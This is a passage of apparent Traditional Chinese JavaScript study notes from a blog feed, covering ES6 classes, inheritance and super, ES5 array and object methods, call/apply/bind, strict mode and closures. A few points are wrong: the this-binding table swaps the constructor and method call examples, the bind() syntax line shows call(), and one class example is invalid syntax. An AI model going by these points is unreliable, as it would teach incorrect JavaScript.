<li>把事務分解成為一個個對象，然後由對象之間分工與合作</li>
</ul>
</li>
<li><p>面向對象特性：</p>
<ul>
<li>封裝性 Encapsulation</li>
<li>繼承性 Inheritance</li>
<li>多態性 Polymorphism</li>
</ul>
</li>
</ol>
<h2 id="類與對象"><a href="#類與對象" class="headerlink" title="類與對象"></a>類與對象</h2><ol>
<li><p>面向對象思維特點：</p>
<ul>
<li>抽取對象共用的屬性和行為組織(方法)，封裝成一個類(模板)</li>
<li>對類進行實例化，獲取類的對象(通過這個類產生不同的對象)</li>
<li>考慮有哪些對象 &gt; 按照面向對象的思維模式創建對象 &gt; 使用對象去做事情</li>
</ul>
</li>
<li><p>JS中的對象(Object)：</p>
<ul>
<li>一組無序的相關屬性和方法的集合，所有的事物都是對象，例如字符串、數值、數組、函數等</li>
<li>對象是由屬性和方法組成的<ul>
<li><font color="#f54747">屬性</font>：事物的特徵，在對象中用 屬性 來表示</li>
<li><font color="#f54747">方法</font>：事物的行為，在對象中用 方法 來表示</li>
</ul>
</li>
</ul>
</li>
<li><p>JS中的類(Class)：</p>
<ul>
<li>在ES6中信增加的概念，使用<font color="#f54747">class</font>關鍵字聲明一個類，以這個類來實例化對象<ul>
<li><font color="#f54747">類</font>抽象了對象的公共部分，<font color="skyblue">泛指</font>某一個 大類</li>
<li><font color="#f54747">對象</font><font color="skyblue">特指</font>某一個通過類實例化的 具體對象</li>
</ul>
</li>
</ul>
</li>
</ol>
<h2 id="類的使用"><a href="#類的使用" class="headerlink" title="類的使用"></a>類的使用</h2><ol>
<li><p>創建類：</p>
<ul>
<li>通過<code>class</code>關鍵字創建類，類名是習慣性定義的首字母大寫</li>
<li>語法：  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span>&#123;</span><br><span class="line">    <span class="comment">// class body</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>Constructor 構造器：</p>
<ul>
<li><code>constructor()</code>方法是累的結構函數，<font color="#f54747">用於傳遞參數，返回實例對象</font></li>
<li>通過<code>new</code>命令生成對象實例時，自動調用該方法</li>
<li>語法：  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title function_">constructor</span>(<span class="params">uname</span>)&#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">uname</span> = uname;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>創建實例：</p>
<ul>
<li>通過<code>new</code>關鍵字創建實例</li>
<li>語法：  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> xxx = <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&#x27;uname&#x27;</span>)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>靜態成員：</p>
<ul>
<li>靜態屬性與方法是類獨有的，實例對象不可調用</li>
<li>通過<code>static</code>關鍵字聲明靜態屬性及方法</li>
<li>語法：  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 靜態屬性</span></span><br><span class="line"><span class="keyword">static</span> name = name</span><br><span class="line"><span class="comment">// 靜態方法</span></span><br><span class="line"><span class="keyword">static</span> <span class="title function_">say</span>(<span class="params"></span>)&#123;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Hello World&#x27;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
<h2 id="類的共有方法"><a href="#類的共有方法" class="headerlink" title="類的共有方法"></a>類的共有方法</h2><ol>
<li><p>創建方法：</p>
<ul>
<li>直接在對象裡添加方法</li>
<li>可以正常傳遞參數</li>
<li>語法：  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Parent</span>&#123;</span><br><span class="line">  <span class="title function_">eat</span>(<span class="params">food</span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">uname</span>, <span class="string">&#x27;like eating&#x27;</span>, food);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>語法規範：</p>
<ul>
<li>類裡面的所有函數不需要寫<code>function</code>關鍵字</li>
<li>多個函數與方法之間不需要添加<code>,</code></li>
</ul>
</li>
</ol>
<h2 id="繼承性"><a href="#繼承性" class="headerlink" title="繼承性"></a>繼承性</h2><ol>
<li><p><code>extends</code>關鍵字：</p>
<ul>
<li>用於讓子類繼承父類的屬性和方法</li>
<li>語法：  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Parent</span>&#123;</span><br><span class="line">    <span class="title function_">moeny</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">100</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Child</span> <span class="keyword">extends</span> <span class="title class_ inherited__">Parent</span>&#123;&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p><code>super</code>關鍵字：</p>
<ul>
<li>用於訪問和調用對象父類上的<font color="#f54747">構造器</font></li>
<li><font color="#f54747">注意：子類在構造器中使用super，則必須放到this的前面</font></li>
<li>語法：  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Parent</span>&#123;</span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">x,y</span>)&#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">x</span> = x</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">y</span> = y</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">sum</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">x</span> + <span class="variable language_">this</span>.<span class="property">y</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Child</span> <span class="keyword">extends</span> <span class="title class_ inherited__">Parent</span>&#123;</span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">x,y</span>)&#123;</span><br><span class="line">        <span class="variable language_">super</span>(x,y)  <span class="comment">// 調用父類的構造器</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 必須後於super</span></span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">x</span> = x</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">y</span> = y</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">subtract</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">x</span> - <span class="variable language_">this</span>.<span class="property">y</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>Override問題：</p>
<ul>
<li>繼承性中屬性和方法的查找原則：<ul>
<li>如果實例化子類輸出一個方法，則優先查看子類有沒有此方法，如果有就執行該方法，沒有就去父類中尋找</li>
</ul>
</li>
<li>使用<code>super</code>關鍵字訪問和調用對象父類上的<font color="#f54747">普通函數</font></li>
<li>語法：  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Parent</span>&#123;</span><br><span class="line">    <span class="title function_">say</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Parent&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Child</span> <span class="keyword">extends</span> <span class="title class_ inherited__">Parent</span>&#123;</span><br><span class="line">    <span class="title function_">say</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="comment">// super.say() 就是調用父類中的普通函數 say()</span></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">super</span>.<span class="title function_">say</span>());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
<h2 id="類與對象的注意點"><a href="#類與對象的注意點" class="headerlink" title="類與對象的注意點"></a>類與對象的注意點</h2><ol>
<li><p>因為在ES6中，類沒有變量提升，所以必須先安裝義類，才能通過實例化對象</p>
</li>
<li><p>類裡面的共有屬性和方法一定要加<code>this</code>關鍵字使用</p>
</li>
<li><p>類中this的指向問題</p>
<ul>
<li>在constructor中，this指向的是<font color="#f54747">實例對象</font></li>
<li>在方法中，this指向的是<font color="#f54747">方法的調用者</font></li>
</ul>
</li>
</ol>
<h2 id="類的本質"><a href="#類的本質" class="headerlink" title="類的本質"></a>類的本質</h2><ul>
<li><p>class本質上還是function，可以簡單的理解為是構造函數的另一種形式</p>
</li>
<li><p>類與構造函數的共同點：</p>
<ol>
<li>有原型對象<code>prototype</code></li>
<li>原型對象<code>prototype</code>裡面有<code>constructor</code>指向構造函數本身</li>
<li>可以通過原型對象添加方法</li>
<li>創建的實例對象有<code>__proto__</code>原型指向構造函數的原型對象</li>
</ol>
</li>
<li><p>所以ES6中類的絕大部分功能，ES5都可以做到，只是新的<code>class</code>寫法讓對象原型的寫法更加清晰，更像面向對象編程語法</p>
</li>
</ul>
]]></content>
      <categories>
        <category>Web FrontEnd</category>
      </categories>
      <tags>
        <tag>javascript</tag>
      </tags>
  </entry>
  <entry>
    <title>JavaScript - ES5</title>
    <url>/myBlog/2022/07/14/2022/FrontEnd/2022-7-14-JS-ES5/</url>
    <content><![CDATA[<h2 id="數組方法"><a href="#數組方法" class="headerlink" title="數組方法"></a>數組方法</h2><ol>
<li><p><code>forEach()</code>方法</p>
<ul>
<li>作用：遍歷數組</li>
<li>語法：  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 參數一、value: 數組當前的值</span></span><br><span class="line"><span class="comment">// 參數二、index: 數組當前的索引</span></span><br><span class="line"><span class="comment">// 參數三、arr: 數組對象本身</span></span><br><span class="line">array.<span class="title function_">forEach</span>(<span class="keyword">function</span>(<span class="params">currentValue, index, arr</span>))</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p><code>filter()</code>方法</p>
<ul>
<li><p>作用：創建一個新的數組，新數組中的元素是通過檢查指定數組中符合條件的所有元素，<font color="#f54747">主要用於篩選數組</font><br>  <font color="#f54747">注意：它直接返回一個新的數組</font></p>
</li>
<li><p>語法：</p>
  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 參數一、value: 數組當前的值</span></span><br><span class="line"><span class="comment">// 參數二、index: 數組當前的索引</span></span><br><span class="line"><span class="comment">// 參數三、arr: 數組對象本身</span></span><br><span class="line"><span class="keyword">var</span> newArr = arr.<span class="title function_">filter</span>(<span class="keyword">function</span>(<span class="params">value, index, arr</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> (value % <span class="number">2</span> === <span class="number">0</span>)    <span class="comment">// 篩選條件</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p><code>some()</code>方法</p>
<ul>
<li>作用：用於檢測數組中的元素是否滿足指定條件，並返回一個 boolean值</li>
<li>備註：如果找到一個滿足條件的元素，則終止循環，不再繼續查找</li>
<li>語法：  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 參數一、value: 數組當前的值</span></span><br><span class="line"><span class="comment">// 參數二、index: 數組當前的索引</span></span><br><span class="line"><span class="comment">// 參數三、arr: 數組對象本身</span></span><br><span class="line"><span class="keyword">var</span> flag = arr.<span class="title function_">some</span>(<span class="keyword">function</span>(<span class="params">value, index, arr</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> value &gt;= <span class="number">20</span>      <span class="comment">// 條件</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>遍歷問題</p>
<ol>
<li><p>遍歷規則：</p>
<ul>
<li><code>forEach()</code>方法如果遇到<code>return true</code>不會終止遍歷</li>
<li><code>filter()</code>方法如果遇到<code>return true</code>也不會終止遍歷</li>
<li><code>some()</code>方法如果遇到<code>return true</code>就會終止遍歷</li>
</ul>
</li>
<li><p><code>return</code>問題：</p>
<ul>
<li><code>return true</code>是為了表示尋找到該元素，就會終止遍歷</li>
<li><code>return false</code>則表示沒有找到該元素，因此會繼續遍歷</li>
</ul>
</li>
</ol>
</li>
</ol>
<h2 id="字符串方法"><a href="#字符串方法" class="headerlink" title="字符串方法"></a>字符串方法</h2><ol>
<li><code>trim()</code>方法<ul>
<li>作用：用於刪除一個字符串兩端的空白字符串</li>
<li>備註：返回的是一個新的字符串，不影響原字符串本身</li>
<li>語法：  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">str.<span class="title function_">trim</span>()</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
<h2 id="對象方法"><a href="#對象方法" class="headerlink" title="對象方法"></a>對象方法</h2><ol>
<li><p><code>Object.keys()</code>方法</p>
<ul>
<li>作用：用於獲取對象自身所有的屬性名，返回一個由屬性名組成的數組</li>
<li>語法：  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Object</span>.<span class="title function_">keys</span>(obj)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p><code>Object.defineProperty()</code>方法</p>
<ul>
<li>作用：定義對象中新屬性 或 修改原有的屬性</li>
<li>語法：  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 參數一、obj: 目標對象</span></span><br><span class="line"><span class="comment">// 參數二、prop: 需定義或修改的屬性名</span></span><br><span class="line"><span class="comment">// 參數三、descriptor&#123;&#125;: 目標屬性所擁有的特性</span></span><br><span class="line"><span class="title class_">Object</span>.<span class="title function_">defineProperty</span>(obj, prop, &#123;</span><br><span class="line">    <span class="attr">value</span>: <span class="string">&#x27;xxx&#x27;</span>,</span><br><span class="line">    <span class="attr">writable</span>: <span class="literal">false</span>,</span><br><span class="line">    <span class="attr">enumerable</span>: <span class="literal">false</span>,</span><br><span class="line">    <span class="attr">configurable</span>: <span class="literal">false</span>,</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li>
<li><code>descriptor&#123;&#125;</code>的說明：<ol>
<li><code>value</code><ul>
<li>設置屬性的值</li>
<li>默認<code>undefined</code></li>
</ul>
</li>
<li><code>writable</code><ul>
<li>值是否可重寫（對象裡有些屬性是不允許隨便修改，例如<code>id</code>）</li>
<li>默認不可被重寫<code>false</code></li>
</ul>
</li>
<li><code>enumerable</code><ul>
<li>目標屬性是否可以被枚舉</li>
<li>默認不可被枚舉<code>false</code></li>
</ul>
</li>
<li><code>configurable</code><ul>
<li>目標屬性是否可以被刪除</li>
<li>是否可以在此修改<font color="#f54747">特性</font></li>
<li>默認不可被刪除<code>false</code></li>
</ul>
</li>
</ol>
</li>
</ul>
</li>
</ol>
<h2 id="函數"><a href="#函數" class="headerlink" title="函數"></a>函數</h2><ol>
<li><p>通過<code>function</code>關鍵字聲明函數（命名函數）</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">fun</span>(<span class="params"></span>)&#123;&#125;</span><br></pre></td></tr></table></figure>

</li>
<li><p>通過函數表達式（匿名函數）</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> fun = <span class="keyword">function</span>(<span class="params"></span>)&#123;&#125;</span><br></pre></td></tr></table></figure>

</li>
<li><p>通過對象寫法</p>
<ul>
<li>簡介：由於<code>Function</code>是屬於對象，所有函數都是<code>Function</code>的實例對象，因此可以用<code>new Function()</code>定義</li>
<li>語法：  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> fun = <span class="keyword">new</span> <span class="title class_">Function</span>(<span class="string">&#x27;參數&#x27;</span>, ... , <span class="string">&#x27;函數體&#x27;</span>)</span><br></pre></td></tr></table></figure></li>
<li>注意：<code>Function</code>裡面的參數與函數體必需是字符串格式</li>
</ul>
</li>
</ol>
<h2 id="函數的種類"><a href="#函數的種類" class="headerlink" title="函數的種類"></a>函數的種類</h2><table>
<thead>
<tr>
<th align="left">函數類型</th>
<th align="left">調用方法</th>
<th align="left">this的指向</th>
</tr>
</thead>
<tbody><tr>
<td align="left">普通函數調用</td>
<td align="left"><code>funct()</code> &#x2F; <code>funct.call()</code></td>
<td align="left"><code>window</code></td>
</tr>
<tr>
<td align="left">構造函數調用</td>
<td align="left"><code>obj.funct()</code></td>
<td align="left">實例對象<code>obj</code></td>
</tr>
<tr>
<td align="left">對象方法調用</td>
<td align="left"><code>xxx = new Person()</code></td>
<td align="left">該方法所屬對象<code>xxx</code></td>
</tr>
<tr>
<td align="left">事件綁定方法</td>
<td align="left"><code>btn.onclick = function()&#123;...&#125;</code></td>
<td align="left">綁定事件的對象<code>btn</code></td>
</tr>
<tr>
<td align="left">定時器函數</td>
<td align="left"><code>setInterval(function()&#123;...&#125;, 1000)</code></td>
<td align="left"><code>window</code></td>
</tr>
<tr>
<td align="left">立即執行函數</td>
<td align="left"><code>(function()&#123;...&#125;)()</code></td>
<td align="left"><code>window</code></td>
</tr>
</tbody></table>
<h2 id="改變函數this指向"><a href="#改變函數this指向" class="headerlink" title="改變函數this指向"></a>改變函數this指向</h2><ol>
<li><p><code>call()</code>方法</p>
<ul>
<li>作用：<ol>
<li>調用函數</li>
<li>修改<code>this</code>的指向</li>
</ol>
</li>
<li>語法：  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 參數一、thisAug: this的指向</span></span><br><span class="line"><span class="comment">// 參數二、args: 傳遞的參數</span></span><br><span class="line">funct.<span class="title function_">call</span>(thisAug, args...)</span><br></pre></td></tr></table></figure></li>
<li>主要應用：實現繼承</li>
</ul>
</li>
<li><p><code>apply()</code>方法</p>
<ul>
<li>作用：<ol>
<li>調用函數</li>
<li>修改<code>this</code>的指向</li>
</ol>
</li>
<li>語法：  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 參數一、thisAug: this的指向</span></span><br><span class="line"><span class="comment">// 參數二、argsArray: 傳遞的參數，必須包含在數組裡</span></span><br><span class="line">funct.<span class="title function_">apply</span>(thisAug, [argsArray])</span><br></pre></td></tr></table></figure></li>
<li>主要應用：借用數組以外的內置對象函數<ol>
<li>利用 apply 借助於數學內置對象求最大值 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> max = <span class="title class_">Math</span>.<span class="property">max</span>.<span class="title function_">apply</span>(<span class="title class_">Math</span>, arr)</span><br></pre></td></tr></table></figure></li>
</ol>
</li>
</ul>
</li>
<li><p><code>bind()</code>方法</p>
<ul>
<li>作用：<ol>
<li>修改<code>this</code>的指向</li>
<li><font color="#f54747">不會調用函數</font></li>
<li>返回值：原函數修改完<code>this</code>指向之後的<font color="#f54747">新函數</font></li>
</ol>
</li>
<li>語法：  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 參數一、thisAug: this的指向</span></span><br><span class="line"><span class="comment">// 參數二、args: 傳遞的參數</span></span><br><span class="line">funct.<span class="title function_">call</span>(thisAug, args...)</span><br></pre></td></tr></table></figure></li>
<li>主要應用：不需要立即調用，但又希望改變函數的內部<code>this</code>指向<ol>
<li>有一個按鈕，點擊後禁用按鈕幾秒鐘 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">btn.<span class="property">onclick</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">disabled</span> = <span class="literal">true</span></span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">disabled</span> = <span class="literal">false</span></span><br><span class="line">    &#125;.<span class="title function_">bind</span>(<span class="variable language_">this</span>), <span class="number">3000</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li>如果希望保留內部<code>this</code>的指向，可以通過參數傳遞其他指向 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span>&#123;</span><br><span class="line">    btn.<span class="property">onclick</span> = funct.<span class="title function_">bind</span>(btn, <span class="variable language_">this</span>)     <span class="comment">// btn指向button對象，this指向實例對象</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">funct</span>(<span class="params">that</span>)&#123;&#125;    <span class="comment">// 接收this(實例對象)</span></span><br></pre></td></tr></table></figure></li>
</ol>
</li>
</ul>
</li>
</ol>
<h2 id="嚴格模式"><a href="#嚴格模式" class="headerlink" title="嚴格模式"></a>嚴格模式</h2><ol>
<li><p>簡介：</p>
<ul>
<li>ES5提供了嚴格模式(strict mode)</li>
<li>嚴格模式具有限制性，即在嚴格的條件下運行JS代碼</li>
</ul>
</li>
<li><p>對JS語義的更改：</p>
<ol>
<li>消除了JS語法的一些不合理、不嚴謹之處，減少怪異行為</li>
<li>消除代碼運行的不安全之處，保證代碼運行的安全</li>
<li>提高編譯器效率，增加運行速度</li>
<li>禁用了 ECMAScript 的未來版本中可能會定義的一些語法，為未來新版本的 JavaScript 做好鋪墊<br> 例如：一些保留字 class, enum, export, extends, import, super 不能作為變量名</li>
</ol>
</li>
<li><p>為腳本開啟嚴格模式：</p>
<ul>
<li>寫法：<font color="#f54747">在所有語句之前放一個特定語句<code>&#39;use strict&#39;;</code></font>  <figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="meta"></span></span></span><br><span class="line"><span class="meta"><span class="language-javascript">    &#x27;use strict&#x27;</span>    <span class="comment">// 開啟嚴格模式</span></span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>為函數開啟嚴格模式：</p>
<ul>
<li>寫法：<font color="#f54747">把<code>&#39;use strict&#39;;</code>聲明放在函數體所有語句之前</font>  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">funct</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="string">&#x27;use strict&#x27;</span>    <span class="comment">// 開啟嚴格模式</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
<h3 id="嚴格模式的變化"><a href="#嚴格模式的變化" class="headerlink" title="嚴格模式的變化"></a>嚴格模式的變化</h3><ol>
<li><p>變量規定：</p>
<ol>
<li><p>函數賦值：</p>
<ul>
<li>正常模式下，如果一個變量沒有聲明就賦值，默認是全局變量</li>
<li>嚴格模式下，這種用法是禁止的，所有變量必須先聲明再使用  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">num = <span class="number">10</span>;   <span class="comment">// !!!語法錯誤</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>刪除變量</p>
<ul>
<li>正常模式下，允許刪除已聲明的變量</li>
<li>嚴格模式下，則嚴禁刪除變量  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">delete</span> num      <span class="comment">// !!!語法錯誤</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
</li>
<li><p><code>this</code>的指向問題：</p>
<ol>
<li><p>全局作用於指向：</p>
<ul>
<li>正常模式下，全局作用域函數中的<code>this</code>指向<code>window</code>對象</li>
<li>嚴格模式下，全局作用域函數中的<code>this</code>是<code>undefined</code>  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">f</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>)   <span class="comment">// undefined</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>構造函數調用：</p>
<ul>
<li>正常模式下，構造函數不加<code>new</code>關鍵字也能調用，<code>this</code>指向全局對象</li>
<li>嚴格模式下，構造函數必須是使用<code>new</code>關鍵字調用，否則<code>this</code>指向<code>undefined</code>  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Person</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">num</span> = <span class="number">10</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="title class_">Person</span>()    <span class="comment">// !!!語法錯誤，因為this指向undefined</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>定時器的<code>this</code>指向仍然是<code>window</code></p>
</li>
<li><p>事件、對象還是指向調用者</p>
</li>
</ol>
</li>
<li><p>函數的變化：</p>
<ol>
<li><p>函數不能有重名的參數</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">f</span>(<span class="params">x, x</span>)&#123;&#125;  <span class="comment">// !!!語法錯誤</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>函數必須聲明在頂層</p>
<ul>
<li>新版的JS會引入「塊級作用域」，為了與新版本接軌，不允許在非函數代碼塊內聲明函數 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="meta">&#x27;use strict&#x27;</span></span><br><span class="line"><span class="keyword">if</span>(<span class="literal">true</span>)&#123;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">f</span>(<span class="params"></span>)&#123;&#125;  <span class="comment">// !!!語法錯誤</span></span><br><span class="line">    <span class="title function_">f</span>()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++)&#123;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">f</span>(<span class="params"></span>)&#123;&#125;  <span class="comment">// !!!語法錯誤</span></span><br><span class="line">    <span class="title function_">f</span>()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">bze</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">eit</span>(<span class="params"></span>)&#123;&#125;    <span class="comment">// 合法</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
</li>
</ol>
<h2 id="高階函數"><a href="#高階函數" class="headerlink" title="高階函數"></a>高階函數</h2><ul>
<li>由於函數也是一種數據類型，同樣可以作為參數，傳遞給另一個函數使用（例如回調函數）</li>
<li>對其他函數進行操作的函數就稱為<font color="#f54747">高階函數</font><ol>
<li><p>接收函數作為參數</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">fn</span>(<span class="params">callback</span>)&#123;</span><br><span class="line">    callback &amp;&amp; <span class="title function_">callback</span>()</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">fn</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;<span class="title function_">alert</span>(<span class="string">&#x27;Hello&#x27;</span>)&#125;)</span><br></pre></td></tr></table></figure>
</li>
<li><p>將函數作為返回值操作</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">fn</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">function</span>(<span class="params"></span>)&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">fn</span>()</span><br></pre></td></tr></table></figure></li>
</ol>
</li>
</ul>
<h2 id="閉包Closure"><a href="#閉包Closure" class="headerlink" title="閉包Closure"></a>閉包Closure</h2><ol>
<li><p>變量作用域：</p>
<ul>
<li>函數內部可以使用全局變量</li>
<li>函數外部不可以使用局部變量</li>
<li>當函數執行完畢，本作用域內的局部變量就會銷毀</li>
</ul>
</li>
<li><p>閉包的簡介：</p>
<ul>
<li>指有權訪問另一個函數作用域中變量的<font color="#f54747">函數</font>。</li>
<li>就是一個作用域可以訪問另一個作用域內部的局部變量，閉包就產生  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">fn</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> num = <span class="number">10</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">fun</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(num)    <span class="comment">// fun函數作用域 訪問了另一個函數fn裡面的局部變量num</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">fun</span>()</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">fn</span>()</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>閉包的作用：</p>
<ul>
